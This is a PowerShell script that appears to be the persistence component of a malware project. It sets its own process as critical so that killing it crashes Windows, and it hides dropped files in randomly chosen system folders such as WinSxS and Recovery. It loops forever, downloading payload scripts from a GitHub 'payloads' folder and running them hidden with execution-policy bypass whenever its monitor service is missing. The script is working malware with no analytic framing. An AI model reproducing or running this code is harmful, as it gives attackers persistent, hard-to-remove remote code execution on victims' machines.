param(
    [string]$rootPath,
    [string]$basePath
)
$user = ((Get-CimInstance -ClassName Win32_ComputerSystem).UserName -split '\\')[-1]

$paths = @(
    ($env:systemdrive+"\Users\$user\AppData\Roaming\Adobe\Acrobat\DC\Security\OCSP\CertCache\Backup\Logs\dump"),
    ($env:systemdrive + "\Recovery"),
    "$env:windir\WinSxS\FileMaps\programdata_microsoft_windows_wer_temp_783673b09e921b6b-cdf_ms\Windows\System32\Tasks\Microsoft\Windows\PLA\Diagnostics\Traces",
    "$env:windir\WinSxS\Temp\ManifestCache\PendingInstalls"
)
Start-Process powershell.exe -ArgumentList "-Command `"whoami >> C:\whoami.txt`""
$b = $basePath -replace '([\\{}])', '`$1'


$signature = @"
using System;
using System.Runtime.InteropServices;

public class CS {
    [DllImport("ntdll.dll")]
    public static extern int RtlSetProcessIsCritical(uint v1, uint v2, uint v3);
}
"@
Add-Type -TypeDefinition $signature
[CS]::RtlSetProcessIsCritical(1, 0, 0) | Out-Null

$serviceName = "MyRootMonService"
$propertyName = "rootMon"
$regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$serviceName"
$issetup = $false

$initServiceRootmonPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
$initServiceRootmonPath = "$initServiceRootmonPath\init_service_rootmon.ps1"
$rootMonScript = ""




$item = Get-ItemProperty -Path "$basePath" -Name $propertyName -ErrorAction SilentlyContinue
if(-not($item)){
    $rootMonScript = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
    $rootMonScript = "$rootMonScript\root_mon.ps1" 
    New-ItemProperty -Path "$basePath" -Name $propertyName -Value $rootMonScript -Force | Out-Null
    $issetup = $true
}

else{
    $rootMonScript = $item.$propertyName
    $issetup = $false
}



if(($rootPath -eq $null) -or ($rootPath -eq "")){
    $rootPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
    $rootPath = "$rootPath\root.ps1"
}

function Get-ServiceReg{
    param([string]$path)
    $c = Get-Item -Path $path -ErrorAction SilentlyContinue
    if(-not($c)){
        return $true
    }
    return $false
}

function Get-ServiceName{
    param([string]$name)
    try {
        $d = Get-Service -Name $name -ErrorAction SilentlyContinue
        if(-not($d)){
            return $true
        }
    }
    catch {
        return $false
    }
    return $false
}


while($true){
    $r = Get-ServiceReg -path $regPath
    $n = Get-ServiceName -name $serviceName

    if(-not(Test-Path -Path $rootMonScript -PathType Leaf)){
        if(-not($issetup)){
            $initServiceRootmonPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
            $initServiceRootmonPath = "$initServiceRootmonPath\init_service_rootmon.ps1"
            $rootMonScript = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
            $rootMonScript = "$rootMonScript\root_mon.ps1"
            Set-ItemProperty -Path "$basePath" -Name $propertyName -Value $rootMonScript -Force | Out-Null
        }
        iwr -Uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/root_mon.ps1" -OutFile $rootMonScript
        iwr -Uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/init_service_rootmon.ps1" -OutFile $initServiceRootmonPath
        powershell.exe -ep bypass -noP -w hidden $initServiceRootmonPath -rootPath $rootPath -scriptPath $rootMonScript -basePath "$b"
    }
    
    elseif($r -or $n){
        iwr -Uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/init_service_rootmon.ps1" -OutFile $initServiceRootmonPath
        powershell.exe -ep bypass -noP -w hidden $initServiceRootmonPath -rootPath $rootPath -scriptPath $rootMonScript -basePath "$b"
    }
    $issetup = $false
}